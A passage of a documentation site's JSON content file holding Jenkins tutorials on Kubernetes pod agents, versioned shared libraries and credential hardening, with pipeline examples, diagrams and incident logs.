sh \u003cspan class=\"hljs-string\">&#x27;npm ci &amp;&amp; npm test&#x27;\u003c/span> } } } }\n}\u003c/code>\u003c/pre>\u003c/div>\n\u003cfigure class=\"dg\" data-rows=\"2\" data-edges=\"ctrl&gt;api;api&gt;pod;pod&gt;build;build&gt;gone\" style=\"--rows:2\">\u003cfigcaption class=\"dg-title\">A build on a Kubernetes agent\u003c/figcaption>\u003cdiv class=\"dg-stage\">\u003csvg viewBox=\"0 0 100 100\" preserveAspectRatio=\"none\" aria-hidden=\"true\" focusable=\"false\">\u003cline x1=\"16.7\" y1=\"25.0\" x2=\"50.0\" y2=\"25.0\"/>\u003cline x1=\"50.0\" y1=\"25.0\" x2=\"83.3\" y2=\"25.0\"/>\u003cline x1=\"83.3\" y1=\"25.0\" x2=\"83.3\" y2=\"75.0\"/>\u003cline x1=\"83.3\" y1=\"75.0\" x2=\"50.0\" y2=\"75.0\"/>\u003c/svg>\u003cbutton type=\"button\" class=\"dg-node k-service\" data-act=\"dg-pick\" data-id=\"ctrl\" data-kind=\"service\" style=\"left:16.7%;top:25.0%;--w:29.3%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Controller\u003c/span>\u003cspan class=\"dg-kind\">Service\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-service\" data-act=\"dg-pick\" data-id=\"api\" data-kind=\"service\" style=\"left:50.0%;top:25.0%;--w:29.3%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Kubernetes API\u003c/span>\u003cspan class=\"dg-kind\">Service\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-service\" data-act=\"dg-pick\" data-id=\"pod\" data-kind=\"service\" style=\"left:83.3%;top:25.0%;--w:29.3%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Agent pod\u003c/span>\u003cspan class=\"dg-kind\">Service\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"build\" data-kind=\"process\" style=\"left:83.3%;top:75.0%;--w:29.3%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Steps run\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"gone\" data-kind=\"process\" style=\"left:50.0%;top:75.0%;--w:29.3%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Pod deleted\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003c/div>\u003cp class=\"sr\">Flow in order: 1, Controller to Kubernetes API; 2, Kubernetes API to Agent pod; 3, Agent pod to Steps run; 4, Steps run to Pod deleted.\u003c/p>\u003cul class=\"dg-legend\" aria-label=\"Legend\">\u003cli>\u003ci class=\"dg-sw k-service\" aria-hidden=\"true\">\u003c/i>Service\u003c/li>\u003cli>\u003ci class=\"dg-sw k-process\" aria-hidden=\"true\">\u003c/i>Step\u003c/li>\u003cli>\u003ci class=\"dg-arrow\" aria-hidden=\"true\">\u003c/i>Numbered arrows show the order of the flow\u003c/li>\u003c/ul>\u003cp class=\"dg-hint small\">Select a component to see what it does and what happens when it fails. \u003cbutton type=\"button\" class=\"btn btn-quiet dg-flow-btn\" data-act=\"dg-flow\" aria-pressed=\"false\">Show the flow\u003c/button>\u003c/p>\u003cdiv class=\"dg-live\" role=\"status\" aria-live=\"polite\">\u003c/div>\u003cdl class=\"dg-list\">\u003cdiv class=\"dg-item\" data-id=\"ctrl\">\u003cdt>Controller \u003cspan class=\"dg-kt\">Service\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Sees a queued build that needs a pod agent.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> An unreachable cluster API leaves builds waiting.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"api\">\u003cdt>Kubernetes API \u003cspan class=\"dg-kt\">Service\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Receives the pod request from the plugin.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Missing RBAC rights give a forbidden error and no pod.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"pod\">\u003cdt>Agent pod \u003cspan class=\"dg-kt\">Service\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Starts the inbound agent and tool containers and connects back.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> An image that cannot be pulled keeps the pod Pending.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"build\">\u003cdt>Steps run \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> The stages run inside the tool containers.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> No resource requests can starve neighbours or get the pod evicted.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"gone\">\u003cdt>Pod deleted \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> The pod is removed when the build ends.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> A hung build holds the pod; use a timeout.\u003c/dd>\u003c/div>\u003c/dl>\u003c/figure>\n\u003ch2 id=\"practical-rules\">Practical rules\u003c/h2>\n\u003cp>Pin image tags so a build today matches a build next month. Set resource requests and limits so one build cannot eat a node. Cache dependencies with a persistent volume or a registry mirror, because a fresh pod starts with an empty disk. Use a timeout and make the pod label unique so pods are easy to find when something is stuck.\u003c/p>\n\u003ch2 id=\"incident-the-agent-pods-that-never-started\">Incident: The agent pods that never started\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>Builds queued for an hour because the pod could not pull its image from a private registry.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"kubectl get pods -n ci\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>kubectl get pods -n ci\u003c/span>\u003cspan class=\"ln out\">build-81-x9k2   0/2   ImagePullBackOff   0   6m\u003c/span>\u003cspan class=\"ln out\">Failed to pull image &quot;registry.example.com/ci/node&quot;: unauthorized\u003c/span>\u003cspan class=\"ln out\">Build #81 waiting for next available executor\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The service account had no image pull secret. Adding the secret to the namespace fixed it, and the team added an alert for agent pods that stay Pending more than five minutes.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Using latest for tool images\u003c/li>\n\u003cli>Not setting resource requests on agent pods\u003c/li>\n\u003cli>Forgetting that a new pod has an empty cache\u003c/li>\n\u003cli>Running privileged Docker-in-Docker without understanding the risk\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"three-ways-to-get-an-agent","text":"Three ways to get an agent"},{"id":"kubernetes-pod-templates","text":"Kubernetes pod templates"},{"id":"practical-rules","text":"Practical rules"},{"id":"incident-the-agent-pods-that-never-started","text":"Incident: The agent pods that never started"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Using Docker with Pipeline","u":"https://www.jenkins.io/doc/book/pipeline/docker/"},{"t":"Kubernetes plugin","u":"https://plugins.jenkins.io/kubernetes/"}],"text":"Where a build runs decides how repeatable it is. Machines that live for years collect leftover files, different tool versions and quiet changes. Jenkins can instead start a clean container per build, which is the same idea you use everywhere else. What you will learn Static agents and why they drift Running a build inside a Docker image Dynamic agents with the Kubernetes plugin and pod templates Sizing, cleanup and caching for ephemeral agents Three ways to get an agent A static agent is a machine you set up once and connect over SSH or the inbound agent. It is simple but drifts. A Docker agent runs the pipeline inside an image you choose. A Kubernetes agent starts a pod for the build and deletes it when the build ends. pipeline { agent { docker { image &#x27;node:20-alpine&#x27; } } stages { stage( &#x27;Test&#x27; ) { steps { sh &#x27;npm ci && npm test&#x27; } } } } Kubernetes pod templates With the Kubernetes plugin the controller talks to a cluster, creates a pod with a jnlp (inbound agent) container plus the tool containers you list, runs the stages inside them and removes the pod after. pipeline { agent { kubernetes { yaml &#x27;&#x27;&#x27; apiVersion: v1 kind: Pod spec: containers: - name: node image: node:20-alpine command: [sleep] args: [infinity] resources: { requests: { cpu: 500m, memory: 1Gi } } &#x27;&#x27;&#x27; } } stages { stage( &#x27;Test&#x27; ) { steps { container( &#x27;node&#x27; ) { sh &#x27;npm ci && npm test&#x27; } } } } } A build on a Kubernetes agent Flow in order: 1, Controller to Kubernetes API; 2, Kubernetes API to Agent pod; 3, Agent pod to Steps run; 4, Steps run to Pod deleted. Service Step Numbered arrows show the order of the flow Select a component to see what it does and what happens when it fails. Controller Service What it does: Sees a queued build that needs a pod agent. If it fails or is weak: An unreachable cluster API leaves builds waiting. Kubernetes API Service What it does: Receives the pod request from the plugin. If it fails or is weak: Missing RBAC rights give a forbidden error and no pod. Agent pod Service What it does: Starts the inbound agent and tool containers and connects back. If it fails or is weak: An image that cannot be pulled keeps the pod Pending. Steps run Step What it does: The stages run inside the tool containers. If it fails or is weak: No resource requests can starve neighbours or get the pod evicted. Pod deleted Step What it does: The pod is removed when the build ends. If it fails or is weak: A hung build holds the pod; use a timeout. Practical rules Pin image tags so a build today matches a build next month. Set resource requests and limits so one build cannot eat a node. Cache dependencies with a persistent volume or a registry mirror, because a fresh pod starts with an empty disk. Use a timeout and make the pod label unique so pods are easy to find when something is stuck. Incident: The agent pods that never started Incident Builds queued for an hour because the pod could not pull its image from a private registry. $ kubectl get pods -n ci build-81-x9k2 0/2 ImagePullBackOff 0 6m Failed to pull image \"registry.example.com/ci/node\": unauthorized Build #81 waiting for next available executor The service account had no image pull secret. Adding the secret to the namespace fixed it, and the team added an alert for agent pods that stay Pending more than five minutes. Common mistakes Using latest for tool images Not setting resource requests on agent pods Forgetting that a new pod has an empty cache Running privileged Docker-in-Docker without understanding the risk"},"cicd/jenkins-shared-libraries-and-reusable-pipelines":{"html":"\u003cp>Jenkinsfiles are copied easily and updated badly. A shared library turns the repeated parts of your pipelines into one place with versions, so a fix reaches every project without fifty pull requests.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>The layout of a shared library\u003c/li>\n\u003cli>Calling a library step from a Jenkinsfile\u003c/li>\n\u003cli>Versioning and testing a library\u003c/li>\n\u003cli>What belongs in a library and what does not\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"layout\">Layout\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"text\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"(library repository)\nvars/\n  buildImage.groovy     # a global step: buildImage(name: 'api')\n  deployTo.groovy\nsrc/org/shop/Util.groovy  # helper classes\nresources/                # templates and files\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">(library repository)\nvars/\n  buildImage.groovy     # a global step: buildImage(name: &#x27;api&#x27;)\n  deployTo.groovy\nsrc/org/shop/Util.groovy  # helper classes\nresources/                # templates and files\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>A file in \u003ccode>vars/\u003c/code> becomes a step with the same name. It defines a \u003ccode>call\u003c/code> method.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"groovy\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"// vars/buildImage.groovy\ndef call(Map cfg) {\n  sh &quot;docker build -t ${cfg.name}:${env.GIT_COMMIT.take(7)} .&quot;\n  if (cfg.push) { sh &quot;docker push ${cfg.name}:${env.GIT_COMMIT.take(7)}&quot; }\n}\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-comment\">// vars/buildImage.groovy\u003c/span>\n\u003cspan class=\"hljs-keyword\">def\u003c/span> call(Map cfg) {\n  sh \u003cspan class=\"hljs-string\">&quot;docker build -t ${cfg.name}:${env.GIT_COMMIT.take(7)} .&quot;\u003c/span>\n  \u003cspan class=\"hljs-keyword\">if\u003c/span> (cfg.push) { sh \u003cspan class=\"hljs-string\">&quot;docker push ${cfg.name}:${env.GIT_COMMIT.take(7)}&quot;\u003c/span> }\n}\u003c/code>\u003c/pre>\u003c/div>\n\u003cdiv class=\"code\" data-lang=\"groovy\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"// Jenkinsfile in a project\n@Library('shop-pipeline@v2.3.0') _\npipeline {\n  agent any\n  stages { stage('Build') { steps { buildImage(name: 'registry/shop/api', push: env.BRANCH_NAME == 'main') } } }\n}\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-comment\">// Jenkinsfile in a project\u003c/span>\n\u003cspan class=\"hljs-meta\">@Library\u003c/span>(\u003cspan class=\"hljs-string\">&#x27;shop-pipeline@v2.3.0&#x27;\u003c/span>) _\npipeline {\n  agent any\n  stages { stage(\u003cspan class=\"hljs-string\">&#x27;Build&#x27;\u003c/span>) { steps { buildImage(\u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">&#x27;registry/shop/api&#x27;\u003c/span>, \u003cspan class=\"hljs-attr\">push:\u003c/span> env.BRANCH_NAME == \u003cspan class=\"hljs-string\">&#x27;main&#x27;\u003c/span>) } } }\n}\u003c/code>\u003c/pre>\u003c/div>\n\u003cfigure class=\"dg\" data-rows=\"2\" data-edges=\"lib&gt;cfg;cfg&gt;jf;jf&gt;run;lib&gt;test\" style=\"--rows:2\">\u003cfigcaption class=\"dg-title\">How a library reaches a pipeline\u003c/figcaption>\u003cdiv class=\"dg-stage\">\u003csvg viewBox=\"0 0 100 100\" preserveAspectRatio=\"none\" aria-hidden=\"true\" focusable=\"false\">\u003cline x1=\"12.5\" y1=\"25.0\" x2=\"37.5\" y2=\"25.0\"/>\u003cline x1=\"37.5\" y1=\"25.0\" x2=\"62.5\" y2=\"25.0\"/>\u003cline x1=\"62.5\" y1=\"25.0\" x2=\"87.5\" y2=\"25.0\"/>\u003cline x1=\"12.5\" y1=\"25.0\" x2=\"37.5\" y2=\"75.0\"/>\u003c/svg>\u003cbutton type=\"button\" class=\"dg-node k-store\" data-act=\"dg-pick\" data-id=\"lib\" data-kind=\"store\" style=\"left:12.5%;top:25.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Library repository\u003c/span>\u003cspan class=\"dg-kind\">Data store\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-security\" data-act=\"dg-pick\" data-id=\"cfg\" data-kind=\"security\" style=\"left:37.5%;top:25.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Library configuration\u003c/span>\u003cspan class=\"dg-kind\">Security\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"jf\" data-kind=\"process\" style=\"left:62.5%;top:25.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Jenkinsfile\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-service\" data-act=\"dg-pick\" data-id=\"run\" data-kind=\"service\" style=\"left:87.5%;top:25.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Pipeline run\u003c/span>\u003cspan class=\"dg-kind\">Service\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-observe\" data-act=\"dg-pick\" data-id=\"test\" data-kind=\"observe\" style=\"left:37.5%;top:75.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Sandbox job\u003c/span>\u003cspan class=\"dg-kind\">Observability\u003c/span>\u003c/button>\u003c/div>\u003cp class=\"sr\">Flow in order: 1, Library repository to Library configuration; 2, Library configuration to Jenkinsfile; 3, Jenkinsfile to Pipeline run; 4, Library repository to Sandbox job.\u003c/p>\u003cul class=\"dg-legend\" aria-label=\"Legend\">\u003cli>\u003ci class=\"dg-sw k-store\" aria-hidden=\"true\">\u003c/i>Data store\u003c/li>\u003cli>\u003ci class=\"dg-sw k-security\" aria-hidden=\"true\">\u003c/i>Security\u003c/li>\u003cli>\u003ci class=\"dg-sw k-process\" aria-hidden=\"true\">\u003c/i>Step\u003c/li>\u003cli>\u003ci class=\"dg-sw k-service\" aria-hidden=\"true\">\u003c/i>Service\u003c/li>\u003cli>\u003ci class=\"dg-sw k-observe\" aria-hidden=\"true\">\u003c/i>Observability\u003c/li>\u003cli>\u003ci class=\"dg-arrow\" aria-hidden=\"true\">\u003c/i>Numbered arrows show the order of the flow\u003c/li>\u003c/ul>\u003cp class=\"dg-hint small\">Select a component to see what it does and what happens when it fails. \u003cbutton type=\"button\" class=\"btn btn-quiet dg-flow-btn\" data-act=\"dg-flow\" aria-pressed=\"false\">Show the flow\u003c/button>\u003c/p>\u003cdiv class=\"dg-live\" role=\"status\" aria-live=\"polite\">\u003c/div>\u003cdl class=\"dg-list\">\u003cdiv class=\"dg-item\" data-id=\"lib\">\u003cdt>Library repository \u003cspan class=\"dg-kt\">Data store\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Holds vars/ steps and src/ helpers, tagged by version.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> An untested change to main breaks every project that tracks it.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"cfg\">\u003cdt>Library configuration \u003cspan class=\"dg-kt\">Security\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Controller setting that names the repository and default version.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> An implicit load of the default branch gives surprise changes.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"jf\">\u003cdt>Jenkinsfile \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Declares @Library with a pinned version and calls steps.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> An unpinned library changes behaviour with no commit in your repository.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"run\">\u003cdt>Pipeline run \u003cspan class=\"dg-kt\">Service\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Loads the library at the pinned version and runs the steps.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> A step that hides secrets in logs or runs arbitrary code is a risk.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"test\">\u003cdt>Sandbox job \u003cspan class=\"dg-kt\">Observability\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> A job that tests a new library version before it is tagged.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Without it the first test is production.\u003c/dd>\u003c/div>\u003c/dl>\u003c/figure>\n\u003ch2 id=\"good-habits\">Good habits\u003c/h2>\n\u003cp>Tag releases (\u003ccode>v2.3.0\u003c/code>) and let each project upgrade on its own schedule. Keep steps small and named for what they do. Never put secrets in the library; read them from credentials at run time. Give a library an owner, a changelog and a test job that runs the steps against a sample repository.\u003c/p>\n\u003ch2 id=\"incident-the-library-change-that-broke-forty-pipelines\">Incident: The library change that broke forty pipelines\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A change on the main branch of the library renamed a parameter and all projects that tracked main failed at once.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">groovy.lang.MissingPropertyException: No such property: imageName for class: buildImage\u003c/span>\u003cspan class=\"ln out\">Finished: FAILURE\u003c/span>\u003cspan class=\"ln out\">40 jobs failed within 10 minutes\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Every project loaded the library at its latest main. After the incident, projects pinned @Library to a tag, the library gained a sandbox job and breaking changes needed a new major version.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Tracking the library&#39;s main branch from every project\u003c/li>\n\u003cli>Putting credentials or tokens in the library\u003c/li>\n\u003cli>Making one huge step that does everything\u003c/li>\n\u003cli>No tests or changelog for the library\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"layout","text":"Layout"},{"id":"good-habits","text":"Good habits"},{"id":"incident-the-library-change-that-broke-forty-pipelines","text":"Incident: The library change that broke forty pipelines"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Extending with Shared Libraries","u":"https://www.jenkins.io/doc/book/pipeline/shared-libraries/"},{"t":"Pipeline syntax reference","u":"https://www.jenkins.io/doc/book/pipeline/syntax/"}],"text":"Jenkinsfiles are copied easily and updated badly. A shared library turns the repeated parts of your pipelines into one place with versions, so a fix reaches every project without fifty pull requests. What you will learn The layout of a shared library Calling a library step from a Jenkinsfile Versioning and testing a library What belongs in a library and what does not Layout (library repository) vars/ buildImage.groovy # a global step: buildImage(name: &#x27;api&#x27;) deployTo.groovy src/org/shop/Util.groovy # helper classes resources/ # templates and files A file in vars/ becomes a step with the same name. It defines a call method. // vars/buildImage.groovy def call(Map cfg) { sh \"docker build -t ${cfg.name}:${env.GIT_COMMIT.take(7)} .\" if (cfg.push) { sh \"docker push ${cfg.name}:${env.GIT_COMMIT.take(7)}\" } } // Jenkinsfile in a project @Library ( &#x27;shop-pipeline@v2.3.0&#x27; ) _ pipeline { agent any stages { stage( &#x27;Build&#x27; ) { steps { buildImage( name: &#x27;registry/shop/api&#x27; , push: env.BRANCH_NAME == &#x27;main&#x27; ) } } } } How a library reaches a pipeline Flow in order: 1, Library repository to Library configuration; 2, Library configuration to Jenkinsfile; 3, Jenkinsfile to Pipeline run; 4, Library repository to Sandbox job. Data store Security Step Service Observability Numbered arrows show the order of the flow Select a component to see what it does and what happens when it fails. Library repository Data store What it does: Holds vars/ steps and src/ helpers, tagged by version. If it fails or is weak: An untested change to main breaks every project that tracks it. Library configuration Security What it does: Controller setting that names the repository and default version. If it fails or is weak: An implicit load of the default branch gives surprise changes. Jenkinsfile Step What it does: Declares @Library with a pinned version and calls steps. If it fails or is weak: An unpinned library changes behaviour with no commit in your repository. Pipeline run Service What it does: Loads the library at the pinned version and runs the steps. If it fails or is weak: A step that hides secrets in logs or runs arbitrary code is a risk. Sandbox job Observability What it does: A job that tests a new library version before it is tagged. If it fails or is weak: Without it the first test is production. Good habits Tag releases ( v2.3.0 ) and let each project upgrade on its own schedule. Keep steps small and named for what they do. Never put secrets in the library; read them from credentials at run time. Give a library an owner, a changelog and a test job that runs the steps against a sample repository. Incident: The library change that broke forty pipelines Incident A change on the main branch of the library renamed a parameter and all projects that tracked main failed at once. groovy.lang.MissingPropertyException: No such property: imageName for class: buildImage Finished: FAILURE 40 jobs failed within 10 minutes Every project loaded the library at its latest main. After the incident, projects pinned @Library to a tag, the library gained a sandbox job and breaking changes needed a new major version. Common mistakes Tracking the library&#39;s main branch from every project Putting credentials or tokens in the library Making one huge step that does everything No tests or changelog for the library"},"cicd/jenkins-credentials-security-and-hardening":{"html":"\u003cp>A CI server can read your code, push to your registry and often deploy to production. That makes it one of the most valuable targets in a company. Hardening Jenkins is mostly a short list of habits applied every time.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>How the credentials store scopes and masks secrets\u003c/li>\n\u003cli>Authentication and role-based access\u003c/li>\n\u003cli>Keeping build code away from the controller\u003c/li>\n\u003cli>Patching, plugins and an audit trail\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"credentials\">Credentials\u003c/h2>\n\u003cp>Store secrets in the credentials store, give each a clear ID and bind them only where needed with \u003ccode>withCredentials\u003c/code>. Jenkins masks the exact value in logs, but masking does not catch a modified copy, so never print secrets at all.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"groovy\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"withCredentials([string(credentialsId: 'registry-token', variable: 'TOKEN')]) {\n  sh 'echo &quot;$TOKEN&quot; | docker login registry.example.com -u ci --password-stdin'\n}\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">withCredentials([string(\u003cspan class=\"hljs-attr\">credentialsId:\u003c/span> \u003cspan class=\"hljs-string\">&#x27;registry-token&#x27;\u003c/span>, \u003cspan class=\"hljs-attr\">variable:\u003c/span> \u003cspan class=\"hljs-string\">&#x27;TOKEN&#x27;\u003c/span>)]) {\n  sh \u003cspan class=\"hljs-string\">&#x27;echo &quot;$TOKEN&quot; | docker login registry.example.com -u ci --password-stdin&#x27;\u003c/span>\n}\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Prefer short-lived credentials (a cloud role or a vault lease) over a long-lived key, and use folder-scoped credentials so a team can only see its own.\u003c/p>\n\u003ch2 id=\"who-can-do-what\">Who can do what\u003c/h2>\n\u003cp>Turn on a security realm (your company SSO) and an authorization strategy such as role-based access: viewers, developers who build, admins who configure. Disable anonymous read. Admin rights should be rare and logged.\u003c/p>\n\u003cfigure class=\"dg\" data-rows=\"2\" data-edges=\"user&gt;authz;authz&gt;job;job&gt;agent;authz&gt;audit\" style=\"--rows:2\">\u003cfigcaption class=\"dg-title\">Layers of Jenkins security\u003c/figcaption>\u003cdiv class=\"dg-stage\">\u003csvg viewBox=\"0 0 100 100\" preserveAspectRatio=\"none\" aria-hidden=\"true\" focusable=\"false\">\u003cline x1=\"12.5\" y1=\"25.0\" x2=\"37.5\" y2=\"25.0\"/>\u003cline x1=\"37.5\" y1=\"25.0\" x2=\"62.5\" y2=\"25.0\"/>\u003cline x1=\"62.5\" y1=\"25.0\" x2=\"87.5\" y2=\"25.0\"/>\u003cline x1=\"37.5\" y1=\"25.0\" x2=\"62.5\" y2=\"75.0\"/>\u003c/svg>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"user\" data-kind=\"process\" style=\"left:12.5%;top:25.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Person\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-security\" data-act=\"dg-pick\" data-id=\"authz\" data-kind=\"security\" style=\"left:37.5%;top:25.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Authorization\u003c/span>\u003cspan class=\"dg-kind\">Security\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-service\" data-act=\"dg-pick\" data-id=\"job\" data-kind=\"service\" style=\"left:62.5%;top:25.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Job and library\u003c/span>\u003cspan class=\"dg-kind\">Service\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-service\" data-act=\"dg-pick\" data-id=\"agent\" data-kind=\"service\" style=\"left:87.5%;top:25.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Agent\u003c/span>\u003cspan class=\"dg-kind\">Service\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-observe\" data-act=\"dg-pick\" data-id=\"audit\" data-kind=\"observe\" style=\"left:62.5%;top:75.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Audit and patching\u003c/span>\u003cspan class=\"dg-kind\">Observability\u003c/span>\u003c/button>\u003c/div>\u003cp class=\"sr\">Flow in order: 1, Person to Authorization; 2, Authorization to Job and library; 3, Job and library to Agent; 4, Authorization to Audit and patching.\u003c/p>\u003cul class=\"dg-legend\" aria-label=\"Legend\">\u003cli>\u003ci class=\"dg-sw k-process\" aria-hidden=\"true\">\u003c/i>Step\u003c/li>\u003cli>\u003ci class=\"dg-sw k-security\" aria-hidden=\"true\">\u003c/i>Security\u003c/li>\u003cli>\u003ci class=\"dg-sw k-service\" aria-hidden=\"true\">\u003c/i>Service\u003c/li>\u003cli>\u003ci class=\"dg-sw k-observe\" aria-hidden=\"true\">\u003c/i>Observability\u003c/li>\u003cli>\u003ci class=\"dg-arrow\" aria-hidden=\"true\">\u003c/i>Numbered arrows show the order of the flow\u003c/li>\u003c/ul>\u003cp class=\"dg-hint small\">Select a component to see what it does and what happens when it fails. \u003cbutton type=\"button\" class=\"btn btn-quiet dg-flow-btn\" data-act=\"dg-flow\" aria-pressed=\"false\">Show the flow\u003c/button>\u003c/p>\u003cdiv class=\"dg-live\" role=\"status\" aria-live=\"polite\">\u003c/div>\u003cdl class=\"dg-list\">\u003cdiv class=\"dg-item\" data-id=\"user\">\u003cdt>Person \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Signs in through single sign-on.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is 